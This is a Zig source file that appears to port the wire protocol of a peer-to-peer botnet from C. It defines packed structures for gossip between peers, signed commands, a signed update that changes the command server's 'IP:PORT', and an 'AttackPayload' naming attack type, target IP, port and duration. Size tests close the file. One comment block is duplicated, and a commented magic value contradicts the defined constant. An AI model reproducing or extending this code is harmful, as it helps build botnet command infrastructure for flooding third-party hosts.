//! # Wire Protocol Definitions
//!
//! Packed structures matching C `protocol_defs.h`
//! All fields are network byte order (Big Endian)
//!
//! ## C Reference: include/protocol_defs.h

const std = @import("std");

// ============================================================
// CONSTANTS (from C: protocol_defs.h lines 8-13)
// ============================================================

pub const WIRE_P2P_MAGIC: u32 = 0x9A1D3F7C;
pub const WIRE_P2P_TYPE_GOSSIP: u8 = 1;
pub const WIRE_P2P_TYPE_CMD: u8 = 2;
pub const WIRE_P2P_TYPE_COUNT_REQ: u8 = 3;
pub const WIRE_P2P_TYPE_COUNT_RESP: u8 = 4;
pub const WIRE_MQTT_PUBLISH: u8 = 0x30;
pub const WIRE_MAX_TOPIC_LEN: usize = 256;
pub const WIRE_CONFIG_MAGIC: u32 = 0x52224AC4;

// ============================================================
// P2P HEADER (from C: protocol_defs.h lines 18-21)
// ============================================================
// typedef struct __attribute__((packed)) {
//     uint32_t magic;
//     uint8_t type;
// } WireP2PHeader;

pub const WireP2PHeader = extern struct {
    magic: u32 align(1),
    type: u8 align(1),

    pub fn init(msg_type: u8) WireP2PHeader {
        return .{
            .magic = std.mem.nativeToBig(u32, WIRE_P2P_MAGIC),
            .type = msg_type,
        };
    }

    pub fn isValid(self: *const WireP2PHeader) bool {
        return std.mem.bigToNative(u32, self.magic) == WIRE_P2P_MAGIC;
    }
};

// ============================================================
// P2P COMMAND (from C: protocol_defs.h lines 23-29)
// ============================================================
// typedef struct __attribute__((packed)) {
//     uint32_t magic;
//     uint8_t type;
//     uint32_t nonce;
//     uint8_t signature[64];
//     uint16_t payload_len;
// } WireP2PCommand;

pub const WireP2PCommand = extern struct {
    magic: u32 align(1),
    type: u8 align(1),
    nonce: u32 align(1),
    signature: [64]u8 align(1),
    payload_len: u16 align(1),

    pub fn getNonce(self: *const WireP2PCommand) u32 {
        return std.mem.bigToNative(u32, self.nonce);
    }

    pub fn getPayloadLen(self: *const WireP2PCommand) u16 {
        return std.mem.bigToNative(u16, self.payload_len);
    }

    pub fn getSignature(self: *const WireP2PCommand) [64]u8 {
        return self.signature;
    }
};

// ============================================================
// P2P GOSSIP (from C: protocol_defs.h lines 31-35)
// ============================================================
// typedef struct __attribute__((packed)) {
//     uint32_t magic;
//     uint8_t type;
//     uint8_t count;
// } WireP2PGossip;

pub const WireP2PGossip = extern struct {
    magic: u32 align(1),
    type: u8 align(1),
    count: u8 align(1),

    pub fn init(neighbor_count: u8) WireP2PGossip {
        return .{
            .magic = std.mem.nativeToBig(u32, WIRE_P2P_MAGIC),
            .type = WIRE_P2P_TYPE_GOSSIP,
            .count = neighbor_count,
        };
    }
};

// ============================================================
// SIGNED CONFIG UPDATE (from C: protocol_defs.h lines 40-47)
// ============================================================
// typedef struct __attribute__((packed)) {
//     uint32_t magic;         // 0xCAFEBABE
//     uint64_t timestamp;     // UTC Timestamp
//     uint32_t version;       // Sequence Check
//     uint8_t  new_ip_len;
//     uint8_t  new_ip[64];    // "IP:PORT" string
//     uint8_t  signature[64]; // Ed25519(magic...new_ip)
// } WireSignedConfigUpdate;

// ============================================================
// SIGNED CONFIG UPDATE (from C: protocol_defs.h lines 40-47)
// ============================================================
// typedef struct __attribute__((packed)) {
//     uint32_t magic;         // 0xCAFEBABE
//     uint64_t timestamp;     // UTC Timestamp
//     uint32_t version;       // Sequence Check
//     uint8_t  new_ip_len;
//     uint8_t  new_ip[64];    // "IP:PORT" string
//     uint8_t  signature[64]; // Ed25519(magic...new_ip)
// } WireSignedConfigUpdate;

pub const WireSignedConfigUpdate = extern struct {
    magic: u32 align(1),
    timestamp: u64 align(1),
    version: u32 align(1),
    new_ip_len: u8 align(1),
    new_ip: [64]u8 align(1),
    signature: [64]u8 align(1),

    pub fn getVersion(self: *const WireSignedConfigUpdate) u32 {
        return std.mem.bigToNative(u32, self.version);
    }

    pub fn getNewIpBytes(self: *const WireSignedConfigUpdate) [64]u8 {
        return self.new_ip;
    }

    /// Get the signed portion (everything before signature)
    pub fn getSignedData(self: *const WireSignedConfigUpdate) []const u8 {
        const bytes = std.mem.asBytes(self);
        return bytes[0 .. @sizeOf(WireSignedConfigUpdate) - 64];
    }
};

// ============================================================
// ATTACK PAYLOAD (from C: p2p.c lines 151-160)
// ============================================================
// Payload Format: [AttackType(1)] [IP(4)] [Port(2)] [Duration(4)]

pub const AttackPayload = extern struct {
    attack_type: u8 align(1),
    target_ip: u32 align(1), // Network byte order
    target_port: u16 align(1), // Network byte order
    duration: u32 align(1), // Network byte order (seconds)

    pub fn getTargetPort(self: *const AttackPayload) u16 {
        return std.mem.bigToNative(u16, self.target_port);
    }

    pub fn getDuration(self: *const AttackPayload) u32 {
        return std.mem.bigToNative(u32, self.duration);
    }
};

// ============================================================
// TESTS
// ============================================================

test "WireP2PHeader size matches C" {
    try std.testing.expectEqual(@as(usize, 5), @sizeOf(WireP2PHeader));
}

test "WireP2PCommand size matches C" {
    // Magic(4) + Type(1) + Nonce(4) + Sig(64) + Len(2) = 75
    try std.testing.expectEqual(@as(usize, 75), @sizeOf(WireP2PCommand));
}

test "WireP2PGossip size matches C" {
    try std.testing.expectEqual(@as(usize, 6), @sizeOf(WireP2PGossip));
}

test "WireSignedConfigUpdate size matches C" {
    // Magic(4) + Time(8) + Ver(4) + Len(1) + IP(64) + Sig(64) = 145
    try std.testing.expectEqual(@as(usize, 145), @sizeOf(WireSignedConfigUpdate));
}

test "AttackPayload size" {
    // Type(1) + IP(4) + Port(2) + Duration(4) = 11
    try std.testing.expectEqual(@as(usize, 11), @sizeOf(AttackPayload));
}
